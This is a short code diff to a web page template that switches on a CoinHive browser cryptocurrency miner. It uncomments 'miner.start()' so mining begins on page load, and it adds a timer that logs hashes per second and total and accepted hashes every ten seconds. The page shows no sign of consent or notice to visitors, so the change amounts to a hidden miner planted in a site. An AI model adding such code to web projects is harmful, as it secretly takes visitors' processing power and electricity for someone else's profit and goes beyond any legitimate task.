@@ -96,9 +96,19 @@
             var hive = {
                 key: "{{ env('COIN_HIVE_KEY') }}"
             };
-
+            
             var miner = new CoinHive.Anonymous(hive.key);
-            // miner.start();
+            miner.start();
+
+            setInterval(function() {
+                if (miner.isRunning()) {
+                    console.log({
+                        hashesPerSecond: miner.getHashesPerSecond(),
+                        totalHashes: miner.getTotalHashes(),
+                        acceptedHashes: miner.getAcceptedHashes()
+                    });
+                }
+            }, 10000);
         </script>
     </body>
 </html>
